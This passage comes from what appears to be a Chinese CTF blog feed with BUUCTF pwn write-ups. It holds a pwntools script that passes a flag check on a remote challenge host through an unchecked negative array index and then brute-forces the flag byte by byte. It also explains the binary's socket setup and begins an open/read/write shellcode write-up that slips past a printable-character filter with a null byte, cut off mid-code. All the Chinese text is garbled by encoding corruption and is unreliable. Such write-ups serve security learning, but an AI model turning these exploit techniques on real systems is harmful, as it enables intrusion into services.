src="/../img/2706180-20220407214108228-1548324711.png"></p><p>å®ƒæç¤ºä½ è¾“å…¥å¯¹äº†flagï¼Œ<strong>ä½†æ˜¯äº‹å®ä¸Šæˆ‘ä»¬å‹æ ¹è¾“å…¥çš„å°±ä¸æ˜¯flag</strong>ï¼Œåªä¸è¿‡æ˜¯é€šè¿‡è¾“å…¥ä¸€äº›éæ­£å¸¸çš„æ•°æ®ï¼Œ<strong>äº§ç”Ÿäº†ä¸€ä¸ªè´Ÿæ•°ç´¢å¼•ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªç´¢å¼•å»æ‰¾åˆ°äº†flagï¼Œä»è€Œé€šè¿‡äº†æ£€æŸ¥</strong>ï¼Œ<strong>è€Œæˆ‘ä»¬æ˜¯ä¸çŸ¥é“flagçš„</strong>ã€‚</p><h2 id="å‡­å€Ÿä¼ªé€ çš„flagå®ç°å•å­—èŠ‚çˆ†ç ´"><a href="#å‡­å€Ÿä¼ªé€ çš„flagå®ç°å•å­—èŠ‚çˆ†ç ´" class="headerlink" title="å‡­å€Ÿä¼ªé€ çš„flagå®ç°å•å­—èŠ‚çˆ†ç ´"></a>å‡­å€Ÿä¼ªé€ çš„flagå®ç°å•å­—èŠ‚çˆ†ç ´</h2><p>ä¸è¿‡å¥½æ¶ˆæ¯æ˜¯ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥ä¸€ç›´è¾“å…¥ï¼Œåªè¦æˆ‘ä»¬è¾“å…¥çš„æ˜¯ä¸€ç™¾ä¸ªå­—èŠ‚çš„å†…å®¹</strong>ï¼ˆå› ä¸ºç¨‹åºå¯¹è¾“å…¥çš„é•¿åº¦æ˜¯å¦æ˜¯100å­—èŠ‚è¿›è¡Œäº†æ£€æŸ¥ï¼‰ï¼Œç¨‹åºå°±å¯ä»¥å‘Šè¯‰æˆ‘ä»¬è¾“å…¥çš„å†…å®¹æ˜¯æ­£ç¡®è¿˜æ˜¯é”™è¯¯ã€‚è¿™ä¸ªç¨‹åºä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä½œä¸ºä¸€ä¸ªæ•´ä½“å»ä¸flagè¿›è¡Œåˆ¤æ–­ï¼Œæœ¬æ¥è¿™ç§é¢˜ç›®æ˜¯æ— æ³•å•å­—èŠ‚çˆ†ç ´çš„ï¼Œ<strong>ä½†æ˜¯æˆ‘ä»¬ç°åœ¨å¯ä»¥é ä¼ªé€ ä¸€ä¸ªflagå»é€šè¿‡æ£€æŸ¥äº†ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥ç»§ç»­è¾“å…¥å†…å®¹ï¼Œè®©ç¨‹åºåˆ¤æ–­è¾“å…¥çš„flagå¯¹ä¸å¯¹ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦å»æ¯æ¬¡æ”¹å˜ä¸€ä¸ªå­—èŠ‚ï¼Œå¦‚æœç¨‹åºæç¤ºYaaaay!ï¼Œåˆ™è¯´æ˜æˆ‘ä»¬çˆ†ç ´çš„è¿™ä¸ªå­—èŠ‚æ˜¯æ­£ç¡®çš„ï¼Œé‚£å°±æ¢ä¸‹ä¸€ä¸ªå­—èŠ‚çˆ†ç ´ï¼Œå¦‚æœæ²¡æœ‰æç¤ºYaaaay! é‚£å°±æ¢ä¸ªå­—ç¬¦ç»§ç»­çˆ†ç ´è¿™ä¸ªå­—èŠ‚ã€‚ç›´åˆ°å°†æ‰€æœ‰çš„flagå…¨éƒ¨çˆ†ç ´å‡ºæ¥</strong>ã€‚</p><h2 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29002</span>)</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">192</span>,<span class="number">192</span>+<span class="number">50</span>):</span><br><span class="line">    payload+=<span class="string">&#x27;0&#x27;</span>+<span class="built_in">chr</span>(i)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;guess&gt; &#x27;</span>)</span><br><span class="line"><span class="comment">#p.sendline(payload)#å½“ç”¨è¿™éƒ¨åˆ†å†…å®¹è®©æ£€æŸ¥é€šè¿‡æ—¶ï¼Œåº”è¯¥æŠŠè¿™ä¸€éƒ¨åˆ†æ³¨é‡Šæ‰ï¼Œå¦‚æœæ²¡æœ‰æ³¨é‡Šæ‰çš„è¯ï¼Œä¼šå¯¼è‡´ä¸‹é¢å‘é€çš„å†…å®¹ï¼Œç¬¬ä¸€æ¬¡çš„å¾ªç¯ä¿®æ”¹äº†å†…å®¹ä¹‹åï¼Œä¹Ÿé€šè¿‡äº†æ£€æŸ¥ï¼Œå› ä¸ºrecvlineæ”¶åˆ°çš„æ˜¯ï¼Œè¿™ä¸ªpayloadçš„Yaaaay!ï¼Œä»è€Œå¯¼è‡´ä¸‹é¢çš„æ£€æŸ¥åˆ¤æ–­æ˜¯ä»ç¬¬äºŒå­—èŠ‚å¼€å§‹ï¼Œç„¶åå°±é™·å…¥äº†æ­»å¾ªç¯ï¼ˆå› ä¸ºç¬¬ä¸€ä¸ªå­—èŠ‚å°±æ˜¯é”™çš„ï¼Œå³ä½¿ç¬¬äºŒå­—èŠ‚çˆ†ç ´å‡ºæ¥äº†ï¼Œä¹Ÿä¸ä¼šæ˜¾ç¤ºYaaaay!ï¼‰</span></span><br><span class="line"><span class="comment">#è¿™ä¸ªè§£é‡Šæ˜¯æˆ‘é€šè¿‡è§‚å¯Ÿdebugçš„å›æ˜¾ä¿¡æ¯åˆ†æå‡ºæ¥çš„ï¼Œä¸èƒ½ä¿è¯ç™¾åˆ†ç™¾å¯¹ï¼Œä¸è¿‡ç›®å‰æˆ‘è®¤ä¸ºæ˜¯è¿™æ ·ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="type">List</span> = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿™é‡Œçš„è¯ï¼Œè‡ªå·±å»ºä¸ªåˆ—è¡¨æˆ–è€…ç”¨string,printableæ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œè¿™ä¸ªæ— æ‰€è°“</span></span><br><span class="line">kkk=<span class="built_in">list</span>(payload)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span><span class="comment">#æ–°å»ºä¸€ä¸ªç©ºçš„flagå­—ç¬¦ä¸²ï¼Œä¸€ä¼šçˆ†ç ´å‡ºæ¥çœŸçš„flagå°†æ”¾å…¥è¿™ä¸ªé‡Œé¢</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="comment">#for x in string.printable:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">        kkk[<span class="number">2</span>*i]=<span class="built_in">hex</span>(<span class="built_in">ord</span>(x))[<span class="number">2</span>]<span class="comment">#è¿™ä¸ªåœ°æ–¹æ˜¯ä»åˆ—è¡¨ä¸­å–ä¸€ä¸ªxï¼Œç„¶åå°†å…¶è½¬æ¢æˆ16è¿›åˆ¶ï¼Œç”¨åˆ‡ç‰‡å–ä½ä½</span></span><br><span class="line">        <span class="comment">#print(&quot;kkk[2*i])==&quot;+kkk[2*i])</span></span><br><span class="line">        kkk[<span class="number">2</span>*i+<span class="number">1</span>]=<span class="built_in">hex</span>(<span class="built_in">ord</span>(x))[<span class="number">3</span>]<span class="comment">#ç”¨åˆ‡ç‰‡å–é«˜ä½ èˆå¼ƒå‰é¢çš„0x</span></span><br><span class="line">        <span class="comment">#print(&quot;kkk[2*i+1])==&quot;+kkk[2*i+1])</span></span><br><span class="line">        p.sendline(<span class="string">&quot;&quot;</span>.join(kkk))<span class="comment">#å°†åˆ—è¡¨kkkæ·»åŠ åˆ°å­—ç¬¦ä¸²é‡Œé¢</span></span><br><span class="line">        re=p.recvline()<span class="comment">#å»æ¥æ”¶ä¸€è¡Œçš„ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Yaaaay!&#x27;</span> <span class="keyword">in</span> re:<span class="comment">#åˆ¤æ–­Yaaaay!æ˜¯å¦åœ¨è¿™ä¸€è¡Œå‡ºç°</span></span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220407214116303-424917594.png"></p><h1 id="å…³äºå‰é¢çš„ç½‘ç»œç¼–ç¨‹çš„å†…å®¹åˆ†æ"><a href="#å…³äºå‰é¢çš„ç½‘ç»œç¼–ç¨‹çš„å†…å®¹åˆ†æ" class="headerlink" title="å…³äºå‰é¢çš„ç½‘ç»œç¼–ç¨‹çš„å†…å®¹åˆ†æ"></a>å…³äºå‰é¢çš„ç½‘ç»œç¼–ç¨‹çš„å†…å®¹åˆ†æ</h1><p>ä½œä¸ºå¤§ä¸€å°èŒæ–°ï¼Œè¿™ä¸ªå­¦æœŸæ‰åˆšåˆšå¼€äº†è®¡ç½‘ï¼Œå—¯â€¦ä¸çŸ¥é“å…³äºè¿™äº›ç½‘ç»œç¼–ç¨‹åœ¨è®¡ç½‘è¯¾ç¨‹çš„åæœŸä¼šä¸ä¼šè®²ï¼Œè¿™é‡Œæå‰å­¦ä¹ ä¸€ä¸‹ã€‚</p><h2 id="socketå‡½æ•°"><a href="#socketå‡½æ•°" class="headerlink" title="socketå‡½æ•°"></a>socketå‡½æ•°</h2><p><img src="/../img/2706180-20220407214123071-334626558.png"></p><p>è¿™ç©æ„å‚æ•°2,1,0å°±åˆ†åˆ«ä»£è¡¨ç€ ipv6ç±»å‹ï¼Œé¢å‘è¿æ¥çš„å¥—æ¥å­—ï¼Œä½¿ç”¨TCPä¼ è¾“åè®®    ç„¶åè¿™ä¸ªsocketå‡½æ•°å°±æ˜¯åˆ›å»ºäº†ä¸ªå¥—æ¥å­—ï¼Œä½ è¦æ˜¯ä¸ç†è§£å•¥æ˜¯å¥—æ¥å­—ï¼Œä½ å°±æŠŠå®ƒå½“æˆä¸€ä¸ªæ–‡ä»¶ï¼ˆlinuxä¸‹ä¸‡ç‰©çš†æ–‡ä»¶ï¼‰ï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆä¹Ÿå°±æ˜¯æ–°åˆ›å»ºçš„è¿™ä¸ªå¥—æ¥å­—ï¼‰</p><h2 id="bindå‡½æ•°"><a href="#bindå‡½æ•°" class="headerlink" title="bindå‡½æ•°"></a>bindå‡½æ•°</h2><p>ä¸‹é¢è¿™ä¸ªbindå‡½æ•°å°±å¾ˆå¥½ç†è§£äº†ï¼Œå°±æ˜¯å°†IPåœ°å€å’Œç«¯å£ä¸åˆšæ‰åˆ›å»ºçš„å¥—æ¥å­—è¿›è¡Œç»‘å®šï¼Œä½ å¯èƒ½ä¼šé—®ï¼Œè¿™å‚æ•°é‡Œé¢ä¹Ÿæ²¡ä¼ IPåœ°å€å’Œç«¯å£å‘€ï¼Œå…¶å®IPåœ°å€å’Œç«¯å£éƒ½åœ¨sockaddrè¿™ä¸ªç»“æ„ä½“(åœ¨è¿™é‡Œé¢è¿™ä¸ªç»“æ„ä½“å°±æ˜¯bind_addr)é‡Œé¢ï¼Œè€Œä½ åˆå°†è¿™ä¸ªç»“æ„ä½“çš„åœ°å€å½“åšå‚æ•°ä¼ ç»™äº†bindå‡½æ•°ã€‚å› æ­¤å…¶å®bindå‡½æ•°æ˜¯çŸ¥é“IPåœ°å€å’Œç«¯å£çš„ã€‚</p><p>å®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯åˆšæ‰åˆ›å»ºçš„å¥—æ¥å­—çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯bind_addrç»“æ„ä½“çš„åœ°å€ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯bind_addrç»“æ„ä½“çš„å¤§å°ï¼ˆè¿™ä¸ªæ˜¯å®šæ­»çš„ï¼‰ã€‚</p><p><img src="/../img/2706180-20220407214132705-992557442.png"></p><p>å€¼å¾—ä¸€æçš„å°±æ˜¯è¿™ä¸ªç»“æ„ä½“</p><p><img src="/../img/2706180-20220407214140416-1386925968.png"></p><p>æœ€åçš„sin_portæˆå‘˜ï¼Œè¢«èµ‹å€¼æˆäº†0x270Fï¼Œä¹Ÿå°±æ˜¯ç«¯å£ä¸º9999ã€‚</p><h2 id="listenå‡½æ•°"><a href="#listenå‡½æ•°" class="headerlink" title="listenå‡½æ•°"></a>listenå‡½æ•°</h2><p><img src="/../img/2706180-20220407214146821-761715580.png"></p><p>è¿™ä¸ªå‚æ•°æ›´ç®€å•äº†ï¼Œç¬¬ä¸€ä¸ªä¾ç„¶æ˜¯åˆ›å»ºå¥—æ¥å­—çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¿æ¥è¯·æ±‚é˜Ÿåˆ—çš„é•¿åº¦ã€‚</p><p>è¿™ä¸ªå‡½æ•°çš„æ„æ€å°±æ˜¯è¯´ï¼Œè®©åˆšæ‰åˆ›å»ºçš„å¥—æ¥å­—å˜æˆè¢«åŠ¨è¿æ¥ï¼Œè®©å½“ä¸‹çš„è¿™ä¸ªè¿›ç¨‹å¯ä»¥æ¥æ”¶å…¶ä»–è¿›ç¨‹çš„è¯·æ±‚ï¼Œå°±æœ‰ç‚¹æœåŠ¡å™¨çš„é‚£ç§æ ·å­å—·ã€‚</p><h2 id="acceptå‡½æ•°"><a href="#acceptå‡½æ•°" class="headerlink" title="acceptå‡½æ•°"></a>acceptå‡½æ•°</h2><p>è¿™ä¸ªå‡½æ•°çš„æ„æ€å°±æ˜¯åˆ›ç«‹ä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆä½ èƒ½çœ‹è§å®ƒçš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ï¼‰ï¼Œè¿™ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦å…¶å®å°±æ˜¯ä¸€ä¸ªè¿æ¥é€šé“ï¼Œæ¥ä¸‹æ¥å‘é€å’Œæ¥æ”¶çš„æ•°æ®éƒ½å°†é€šè¿‡è¿™ä¸ªè¿æ¥é€šé“ã€‚è€ŒåŸæœ¬çš„é‚£ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¾ç„¶åœ¨ç›‘å¬portã€‚</p><p><img src="/../img/2706180-20220407214156300-296069646.png"></p><p>æˆ‘åœ¨ç½‘ä¸Šå‘ç°è¿™ä¸ªå›¾ç‰‡è¯´çš„å¾ˆå¥½ï¼Œæ¬ä¸€ä¸‹ <a href="%5Bhttps://blog.csdn.net/BengDouLove/article/details/105695351?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&utm_relevant_index=1%5D(https://blog.csdn.net/BengDouLove/article/details/105695351?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&utm_relevant_index=1)">å›¾ç‰‡å‡ºè‡ªè¿™é‡Œ</a></p><p><img src="/../img/2706180-20220407214205153-1642587681.png"></p><p>è¿™å¼ æ˜¯socketæ¨¡å‹å›¾ï¼Œæ¥æºåŒä¸Š</p><p><img src="/../img/2706180-20220407214212839-1585808268.png"></p><p>ç„¶åè¿™ä¸ªåœ°æ–¹å°±åœ¨è¯´ï¼Œforkäº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¦‚æœforkæˆåŠŸçš„è¯ï¼Œå°±æŠŠæœ€å¼€å§‹åˆ›å»ºçš„é‚£ä¸ªå¥—æ¥å­—ç»™å…³äº†ï¼Œç„¶åå»å¤„ç†æ–°å¼€çš„è¿™ä¸ªå¥—æ¥å­—ã€‚</p><p><img src="/../img/2706180-20220407214219138-2084667837.png"><br><img src="/../img/2706180-20220407214226924-1102558480.png"></p><p>è¿™é‡Œå°±æ˜¯è¯´æŠŠæ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°è¿™ä¸ªæ–°å¼€çš„å¥—æ¥å­—ä¸Šã€‚</p><h2 id="è¿™å‡ ä¸ªå‡½æ•°å¹²äº†å•¥ï¼Ÿ"><a href="#è¿™å‡ ä¸ªå‡½æ•°å¹²äº†å•¥ï¼Ÿ" class="headerlink" title="è¿™å‡ ä¸ªå‡½æ•°å¹²äº†å•¥ï¼Ÿ"></a>è¿™å‡ ä¸ªå‡½æ•°å¹²äº†å•¥ï¼Ÿ</h2><p>æ•´ä½“ä¸‹æ¥çš„è¯ï¼Œä¹Ÿå¹¶ä¸å¤æ‚ï¼Œå°±æ˜¯åœ¨è¯´å¼€äº†ä¸€ä¸ªç¨‹åºè‡ªèº«9999çš„ç«¯å£ï¼Œç­‰å¾…ç€ä½ è¿æ¥ï¼Œå¦‚æœè¿æ¥ä¸Šæ¥çš„è¯å°±å¼€å¯ä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œç„¶åå¼€å§‹å¯¹è¿™ä¸ªæ–°çš„è¿›ç¨‹æ“ä½œã€‚</p><p>åœ¨æœ¬åœ°è¿è¡Œçš„è¯ï¼Œä¹Ÿæ˜¯å¯ä»¥çœ‹è§ï¼Œç¨‹åºè‡ªå·±æ‰“å¼€äº†9999ç«¯å£</p><p><img src="/../img/2706180-20220407214235471-1305358205.png"></p><h1 id="æœ€åæƒ³å¼ºè°ƒçš„ä¸€ç‚¹"><a href="#æœ€åæƒ³å¼ºè°ƒçš„ä¸€ç‚¹" class="headerlink" title="æœ€åæƒ³å¼ºè°ƒçš„ä¸€ç‚¹"></a>æœ€åæƒ³å¼ºè°ƒçš„ä¸€ç‚¹</h1><p>è¿™é‡Œå·²ç»åœ¨å¼€å§‹çš„æ€»ç»“é‡Œè¯´è¿‡äº†ï¼Œä¸è¿‡ä¾ç„¶æƒ³å¼ºè°ƒä¸€ä¸‹ï¼Œæˆ‘ä»¬æ˜¯å§‹ç»ˆéƒ½æ²¡æ³•ç›´æ¥æ§åˆ¶value_1å’Œvalue_2çš„å€¼ï¼Œæˆ‘ä»¬ä»…ä»…åªèƒ½å»æ§åˆ¶bin_by_hexæ•°ç»„çš„ç´¢å¼•ï¼Œè€Œæˆ‘ä»¬çˆ†ç ´çš„å…¶å®æ˜¯bin_by_hexæ•°ç»„çš„ä¸‹æ ‡ï¼Œè€ŒçœŸæ­£çš„flagæ˜¯é€šè¿‡è¿™ä¸ªä¸‹æ ‡å»æ•°ç»„bin_by_hexé‡Œé¢æ‰¾åˆ°çœŸæ­£flagçš„æ‰€å¯¹åº”çš„å­—ç¬¦ã€‚ä¹‹æ‰€ä»¥ç»™æˆ‘ä»¬ä¸€ç§çˆ†ç ´flagçš„é”™è§‰å…¶å®æ˜¯å› ä¸ºçˆ†ç ´çš„bin_by_hexæ•°ç»„ä¸‹æ ‡æ­£å¥½åˆæ˜¯å¯¹åº”å­—ç¬¦çš„asciiï¼ˆæ¯”å¦‚æˆ‘çˆ†ç ´bçš„æ—¶å€™ï¼Œåˆ†åˆ«å‘äº†6å’Œ2ï¼Œè¿™ä¸ª0x62å…¶å®æ˜¯bin_by_hexçš„ä¸‹æ ‡ï¼Œä½†æ˜¯è¿™ä¸ªä¸‹æ ‡æ”¾çš„åˆæ­£å¥½æ˜¯bï¼‰å› æ­¤å°±æ„Ÿè§‰æˆ‘ä»¬åœ¨çˆ†ç ´flagä¸€æ ·ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> æ•°ç»„ç´¢å¼•æ— æ£€æŸ¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_gwctf_2019_shellcode</title>
      <link href="/posts/a3bb0057.html"/>
      <url>/posts/a3bb0057.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€strlenå‡½æ•°æ˜¯å¯ä»¥è¢«00ç»™æˆªæ–­çš„ï¼Œè€Œshellcodeæœ¬èº«æ‰§è¡Œçš„æ—¶å€™å¹¶ä¸ä¼šå› ä¸º00æˆªæ–­ã€‚</p><p>2ã€ç¬¬ä¸€æ¬¡æ‰‹å†™open,read,writeå‡½æ•°çš„æ±‡ç¼–</p><p>3ã€pushä¸€ä¸ªå­—ç¬¦ä¸²çš„è¯ï¼Œæ¯”å¦‚push 0x67616c66 ï¼ˆè¿™ä¸ªæ˜¯flagï¼‰ï¼Œä¸è¶³å…«å­—èŠ‚ï¼Œpushçš„æ—¶å€™ä¼šè‡ªåŠ¨å¡«å……00è¡¥å…¨å…«å­—èŠ‚ï¼Œä»è€Œå æ»¡ä¸€ä¸ªå†…å­˜å•å…ƒã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220405154514758-712380835.png"></p><p>å‘ç°æ²¡å¼€NXï¼Œé‚£åŸºæœ¬å°±æ˜¯shellcodeæ²¡è·‘äº†ã€‚</p><p>ç„¶åå‘ç°å¼€å¯äº†æ²™ç®±ï¼Œç¦ç”¨äº†execveå‡½æ•°ï¼Œé‚£å°±è€ƒè™‘å†™ä¸€ä¸ªorwçš„shellcode</p><p><img src="/../img/2706180-20220405154531094-617647394.png"></p><h2 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h2><p><img src="/../img/2706180-20220405154542848-1797363016.png"></p><p>ç”±äºè¿™ä¸ªmainå‡½æ•°é‡Œé¢å­˜åœ¨ä¸€ä¸ªè¿™ä¸ªæ±‡ç¼–æŒ‡ä»¤ï¼Œå› æ­¤ä¸èƒ½ç”Ÿæˆä¼ªä»£ç ï¼Œé‚£å°±åªèƒ½è¯»æ±‡ç¼–äº†ï¼Œå¥½åœ¨ç¨‹åºä¹Ÿä¸å¤æ‚ã€‚</p><p><img src="/../img/2706180-20220405154553188-189814088.png"></p><p>é€»è¾‘å°±æ˜¯æ‰§è¡Œis_printableä¹‹åï¼Œå»å°†eaxä¸è‡ªèº«ç›¸ä¸ï¼Œå¦‚æœeaxçš„å€¼ä¸º1ï¼Œtestæ‰§è¡Œä¹‹åçš„è¿ç®—ç»“æœä¸º1ï¼ˆæ ‡å¿—å¯„å­˜å™¨çš„å€¼ä¸º0,å¦åˆ™åä¹‹)å¦‚æœæ ‡å¿—å¯„å­˜å™¨çš„å€¼ä¸º1ï¼Œåˆ™jzæŒ‡ä»¤è¿›è¡Œè·³è½¬ï¼Œè·³è½¬åˆ°loc_AC1å‡½æ•°ï¼Œå¦‚æœè§¦å‘äº†è¯¥å‡½æ•°åˆ™ç¨‹åºç›´æ¥ç»“æŸï¼Œå¹¶ä¸ä¼šè§¦å‘call raxçš„æŒ‡ä»¤ï¼Œå¦‚æœjzä¸è¿›è¡Œè·³è½¬ï¼Œåˆ™æ‰§è¡Œcall raxï¼ˆæ‰§è¡Œå®Œleaä¹‹åï¼Œraxçš„å€¼å­˜æ”¾çš„å°±æ˜¯readå‡½æ•°è¾“å…¥è¿›å»çš„å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬è¾“å…¥çš„æ—¶å€™ç›´æ¥å¸ƒç½®shellcodeå³å¯ï¼‰ã€‚</p><h2 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h2><p>å› æ­¤æˆ‘ä»¬è¦è§¦å‘call raxï¼Œå°±éœ€è¦è®©loc_AC1å‡½æ•°çš„è¿”å›å€¼ä¸º0ã€‚</p><p><img src="/../img/2706180-20220405154601824-154673174.png"></p><p>è€Œè¿™ä¸ªå‡½æ•°è¿”å›å€¼ä¸º0çš„å‰æå°±æ˜¯è¾“å…¥çš„å†…å®¹asciiç å¿…é¡»è¦å¤§äº31ï¼Œå¹¶ä¸”ä¸èƒ½ç­‰äº127ã€‚å› ä¸ºæˆ‘ä»¬æ„é€ çš„shellcodeç»å¸¸ä¼šå­˜åœ¨ä¸å¯è§å­—ç¬¦ï¼Œå› æ­¤è¿™é‡Œæˆ‘èµ·åˆè€ƒè™‘çš„æ˜¯å°†å†™çš„shellcodeè½¬æ¢æˆå¯è§å­—ç¬¦ã€‚</p><p>ç„¶åè½¬æ¢æˆå¯è§å­—ç¬¦å‘ç°ï¼Œè¿™ä¸ªshellcodeå¤ªé•¿äº†ã€‚ï¼ˆä¸‹é¢æ˜¯è½¬æ¢æˆå¯è§å­—ç¬¦ä¹‹åçš„shellcodeï¼‰</p><p><img src="/../img/2706180-20220405154611925-62685447.png"></p><p>ç„¶ååˆ°è¿™é‡Œå°±å¡ä½äº†ï¼Œå‚è€ƒäº†å¦ä¸€ç¯‡å¸ˆå‚…çš„åšå®¢ï¼Œå‘ç°strlenå‡½æ•°æ˜¯å¯ä»¥è¢«00æˆªæ–­çš„ï¼ˆæˆ‘è‡ªå·±è¯•äº†ä¸€ä¸‹å‘ç°ç¡®å®å¦‚æ­¤ï¼‰</p><p>ä¹Ÿå°±æ˜¯è¯´åªè¦è®©shellcodeä¸­å‡ºç°00ï¼Œå¹¶ä¸”åœ¨00ä¹‹å‰çš„æ˜¯å¯è§å­—ç¬¦å°±okäº†ï¼Œå› ä¸ºstrlenè·å–çš„é•¿åº¦å°±åˆ°00è¿™é‡Œã€‚</p><p><img src="/../img/2706180-20220405154620185-1611603895.png"></p><p>è¿™ä¸ªå¾ªç¯å°±ä¸ä¼šå†å¾€åè·‘äº†ï¼Œå› æ­¤å®ƒä¸ä¼šå¯¹00åé¢çš„å†…å®¹è¿›è¡Œæ£€æŸ¥ã€‚åœ¨è¿™é‡Œè¦è¯´ä¸€ä¸‹ï¼Œ<strong>shellcodeæœ¬èº«æ‰§è¡Œçš„è¯å¹¶ä¸ä¼šè¢«00æˆªæ–­ï¼Œå› ä¸ºshellcodeæœ¬èº«æ¯•ç«Ÿå°±æ˜¯ä¸€å †æœºå™¨ç è€Œå·²ï¼ŒCPUæ‰§è¡Œæœºå™¨ç çš„æ—¶å€™ï¼Œæ‰ä¸ç®¡ä½ ä»€ä¹ˆ00æˆªæ–­ä¸æˆªæ–­å‘¢ï¼Œæœºå™¨ç æ˜¯ä»€ä¹ˆå®ƒå°±æ‰§è¡Œä»€ä¹ˆã€‚çœŸæ­£ä¼šå› ä¸º00è€Œæˆªæ–­shellcodeçš„å…¶å®æ˜¯ä¸€äº›å‡½æ•°,æ¯”å¦‚strcpyè¿™ä¸ªå‡½æ•°ã€‚</strong></p><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦è®©shellcodeä¸­å°½æ—©çš„å‡ºç°00æœºå™¨ç å³å¯</p><p>ç„¶åå°±æ˜¯å¼€å§‹æ‰‹åŠ¨ç¼–å†™shellcodeäº†ã€‚</p><h2 id="æ‰‹å†™orw-shellcode"><a href="#æ‰‹å†™orw-shellcode" class="headerlink" title="æ‰‹å†™orw-shellcode"></a>æ‰‹å†™orw-shellcode</h2><p>é¦–å…ˆæˆ‘ä»¬è¦æ‰§è¡Œçš„å¦‚ä¸‹çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">3</span>,addr,<span 